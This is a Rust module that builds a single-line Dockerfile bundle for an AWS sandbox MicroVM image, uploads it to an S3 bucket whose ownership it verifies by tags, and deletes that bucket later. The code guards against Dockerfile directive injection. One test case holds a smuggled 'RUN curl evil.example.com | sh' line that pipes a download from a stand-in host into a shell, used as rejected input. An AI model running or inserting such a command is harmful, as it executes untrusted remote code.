//! The bundle a Live AWS sandbox's MicroVM image is built from, rendered by its own controller.
//!
//! `CreateMicrovmImage` builds from a zip holding a Dockerfile, read from S3 in the image's own
//! region. The release's image already carries the agent, its contract and the original command,
//! so the Dockerfile is one `FROM` line. It is written to a bucket the deployment owns, which the
//! controller creates on its first build and deletes with the sandbox.

use std::io::Write;

use alien_aws_clients::s3::{PutObjectRequest, S3Api};
use alien_core::sandbox_build_role::SANDBOX_BUNDLE_KEY_PREFIX;
use alien_error::{AlienError, Context, ContextError, IntoAlienError};
use sha2::{Digest, Sha256};
use tracing::info;
use zip::write::SimpleFileOptions;
use zip::ZipWriter;

use crate::error::{ErrorData, Result};
use crate::storage::{
    bucket_not_owned, inspect_bucket, is_accepted_without_body, is_bucket_already_owned,
    is_bucket_missing, is_outcome_unknown, ExistingBucket,
};

/// A rendered bundle and where it goes.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct RenderedBundle {
    pub(crate) bucket: String,
    /// `sandbox-bundle/<sha256 of the zip>/bundle.zip`: a release that changes nothing renders the
    /// same bytes, so the same key, and so no rebuild.
    pub(crate) key: String,
    pub(crate) zip: Vec<u8>,
}

impl RenderedBundle {
    pub(crate) fn uri(&self) -> String {
        format!("s3://{}/{}", self.bucket, self.key)
    }
}

/// Renders the bundle that builds `image`.
pub(crate) fn render(bucket: &str, image: &str, resource_id: &str) -> Result<RenderedBundle> {
    // A newline in the reference would write Dockerfile directives of its own.
    if image.is_empty() || image.chars().any(|c| c.is_whitespace() || c.is_control()) {
        return Err(AlienError::new(ErrorData::ResourceConfigInvalid {
            message: format!(
                "sandbox image '{image}' is empty or carries whitespace or control characters"
            ),
            resource_id: Some(resource_id.to_string()),
        }));
    }
    let dockerfile = format!("FROM {image}\n");

    let failed = || ErrorData::ResourceConfigInvalid {
        message: "could not assemble the sandbox image bundle".to_string(),
        resource_id: Some(resource_id.to_string()),
    };
    let mut zip = ZipWriter::new(std::io::Cursor::new(Vec::new()));
    // A fixed timestamp keeps the bytes, and so the key, a function of the image alone. The
    // archive is flat: `CreateMicrovmImage` looks for the Dockerfile at its root.
    let options = SimpleFileOptions::default()
        .last_modified_time(zip::DateTime::default())
        .unix_permissions(0o644);
    zip.start_file("Dockerfile", options)
        .into_alien_error()
        .context(failed())?;
    zip.write_all(dockerfile.as_bytes())
        .into_alien_error()
        .context(failed())?;
    let zip = zip
        .finish()
        .into_alien_error()
        .context(failed())?
        .into_inner();

    Ok(RenderedBundle {
        bucket: bucket.to_string(),
        key: format!(
            "{SANDBOX_BUNDLE_KEY_PREFIX}/{:x}/bundle.zip",
            Sha256::digest(&zip)
        ),
        zip,
    })
}

/// Creates the bundle bucket unless this sandbox already has it, then writes the bundle.
///
/// `requested` records that a `CreateBucket` was sent, so an untagged bucket found after a lost
/// response is known to be this one; it is held by the caller across retries.
pub(crate) async fn write(
    client: &dyn S3Api,
    bundle: &RenderedBundle,
    our_tags: &std::collections::HashMap<String, String>,
    resource_id: &str,
    requested: &mut bool,
) -> Result<()> {
    let bucket = &bundle.bucket;
    match inspect_bucket(client, bucket, our_tags, resource_id).await? {
        ExistingBucket::Ours => {}
        ExistingBucket::Untagged if *requested => {
            tag(client, bucket, our_tags, resource_id).await?;
        }
        ExistingBucket::Missing => {
            *requested = true;
            info!(sandbox_id = %resource_id, %bucket, "Creating the sandbox bundle bucket");
            match client.create_bucket(bucket).await {
                Ok(()) => {}
                Err(error)
                    if is_bucket_already_owned(&error) || is_accepted_without_body(&error) => {}
                Err(error) => {
                    if !is_outcome_unknown(&error) {
                        *requested = false;
                    }
                    return Err(error.context(ErrorData::CloudPlatformError {
                        message: format!("Failed to create the sandbox bundle bucket '{bucket}'"),
                        resource_id: Some(resource_id.to_string()),
                    }));
                }
            }
            tag(client, bucket, our_tags, resource_id).await?;
        }
        ExistingBucket::Untagged | ExistingBucket::Foreign => {
            return Err(bucket_not_owned(resource_id, bucket));
        }
    }

    client
        .put_object(&PutObjectRequest {
            bucket: bucket.clone(),
            key: bundle.key.clone(),
            body: bundle.zip.clone(),
            content_type: Some("application/zip".to_string()),
            content_md5: None,
            server_side_encryption: None,
            storage_class: None,
        })
        .await
        .context(ErrorData::CloudPlatformError {
            message: format!("Failed to write the sandbox bundle '{}'", bundle.uri()),
            resource_id: Some(resource_id.to_string()),
        })?;
    Ok(())
}

async fn tag(
    client: &dyn S3Api,
    bucket: &str,
    our_tags: &std::collections::HashMap<String, String>,
    resource_id: &str,
) -> Result<()> {
    client
        .put_bucket_abac_tags(bucket, our_tags)
        .await
        .context(ErrorData::CloudPlatformError {
            message: format!("Failed to tag the sandbox bundle bucket '{bucket}'"),
            resource_id: Some(resource_id.to_string()),
        })
}

/// Empties and deletes the bundle bucket if it is this sandbox's. A bucket it cannot prove is its
/// own is kept: its name carries the deployment's prefix, but the tags are the proof.
pub(crate) async fn delete(
    client: &dyn S3Api,
    bucket: &str,
    our_tags: &std::collections::HashMap<String, String>,
    resource_id: &str,
    requested: bool,
) -> Result<()> {
    match inspect_bucket(client, bucket, our_tags, resource_id).await? {
        ExistingBucket::Missing => return Ok(()),
        ExistingBucket::Ours => {}
        ExistingBucket::Untagged if requested => {}
        ExistingBucket::Untagged | ExistingBucket::Foreign => {
            info!(sandbox_id = %resource_id, %bucket, "Keeping a bundle bucket this sandbox cannot prove it created");
            return Ok(());
        }
    }
    let deleted = match client.empty_bucket(bucket).await {
        Ok(()) => client.delete_bucket(bucket).await,
        Err(error) => Err(error),
    };
    match deleted {
        Ok(()) => {
            info!(sandbox_id = %resource_id, %bucket, "Deleted the sandbox bundle bucket");
            Ok(())
        }
        Err(error) if is_bucket_missing(&error) => Ok(()),
        Err(error) => Err(error.context(ErrorData::CloudPlatformError {
            message: format!("Failed to delete the sandbox bundle bucket '{bucket}'"),
            resource_id: Some(resource_id.to_string()),
        })),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn dockerfile(bundle: &RenderedBundle) -> String {
        let mut archive =
            zip::ZipArchive::new(std::io::Cursor::new(&bundle.zip)).expect("a zip archive");
        assert_eq!(archive.len(), 1, "the archive holds the Dockerfile alone");
        let mut contents = String::new();
        std::io::Read::read_to_string(
            &mut archive.by_name("Dockerfile").expect("at the root"),
            &mut contents,
        )
        .expect("reads");
        contents
    }

    /// The key is the content's digest: the same image renders the same key, so an unchanged
    /// release rebuilds nothing, and a new image (a new agent or a new base) renders a new one.
    #[test]
    fn the_key_follows_the_image_and_nothing_else() {
        let image = "123456789012.dkr.ecr.us-east-1.amazonaws.com/acme/agents@sha256:aaaa";
        let first = render("p-agents-sbx", image, "agents").unwrap();
        let again = render("p-agents-sbx", image, "agents").unwrap();
        let next = render(
            "p-agents-sbx",
            "123456789012.dkr.ecr.us-east-1.amazonaws.com/acme/agents@sha256:bbbb",
            "agents",
        )
        .unwrap();

        assert_eq!(first, again);
        assert_ne!(first.key, next.key);
        assert!(first.key.starts_with("sandbox-bundle/"));
        assert_eq!(dockerfile(&first), format!("FROM {image}\n"));
    }

    #[test]
    fn a_reference_that_would_write_directives_is_refused() {
        for image in [
            "",
            "alpine\nRUN curl evil.example.com | sh",
            "alpine latest",
        ] {
            render("p-agents-sbx", image, "agents")
                .expect_err(&format!("{image:?} must not reach a Dockerfile"));
        }
    }
}
